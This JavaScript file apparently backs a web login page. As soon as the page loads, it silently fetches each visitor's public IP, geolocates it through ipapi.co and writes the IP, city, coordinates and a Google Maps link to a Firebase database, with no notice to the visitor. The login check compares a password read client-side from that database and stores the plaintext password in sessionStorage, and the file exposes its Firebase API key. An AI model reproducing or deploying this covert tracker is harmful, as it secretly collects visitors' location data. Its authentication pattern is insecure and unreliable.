const firebaseConfig = {
  apiKey: "AIzaSyAzAG0a_ribj20DRAWaDNiw5B2wvtOcpYk",
  authDomain: "personid-9e533.firebaseapp.com",
  databaseURL: "https://personid-9e533-default-rtdb.firebaseio.com",
  projectId: "personid-9e533",
  storageBucket: "personid-9e533.appspot.com",
  messagingSenderId: "247603082330",
  appId: "1:247603082330:web:e71b378a57133300109463",
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
let db = firebase.database();

const getPlain = async () => {
  return await $.get("https://ipecho.net/plain");
};

const request = async (data) => {
  return await $.get("https://ipapi.co/" + data + "/json/");
};

const ajaxFunc = async (_data) => {
  await $.ajax({
    type: "GET",
    url: "https://ipapi.co/" + _data + "/json/",
    dataType: "json",
  }).done((getData) => {
    const getAll = {
      ip: getData.ip,
      city: getData.city,
      latitude: getData.latitude,
      longitude: getData.longitude,
      mapsUrl:
        "https://www.google.com/maps/place/" +
        getData.latitude +
        "," +
        getData.longitude,
    };

    Object.assign(getAll, todayDate());
    const ID = createID();
    insert("GetInfo",ID,getAll);
  });
};

getPlain().then((data) => {
  ajaxFunc(data);
});

//Firebase her şeyi sil
const deleteAll = (columnName) => {
  db.ref(columnName + "/").on("value", (data) => {
    Object.keys(data.val()).forEach((e) => {
      db.ref(columnName + "/" + e).remove();
    });
  });
};

//Id üret
const createID = () => {
  let idKey = db.ref().child("/").push().key;
  return idKey;
};

//Added !
const insert = (columnName, id, data) => {
  db.ref(columnName + "/" + id).set(data);
};

//Today Date
const todayDate = () => {
  const date = new Date();
  return { dataIsGetDate: date.toLocaleString("tr") };
};

$("#btnLogin").click(function (e) {
  //Data Find
  let controlFind = false;
  const Find = (async (columnName, id) => {
    db.ref(columnName + "/" + id).on("value", (data) => {
      if (data.val() === null) {
        controlFind = false;
      } else {
        if (data.val() === $("#pass").val()) {
          controlFind = true;
          sessionStorage.setItem($("#kad").val(), $("#pass").val());
          window.location.pathname = "admin.html";
        }
      }
    });
  })("GetInfo", $("#kad").val());
});
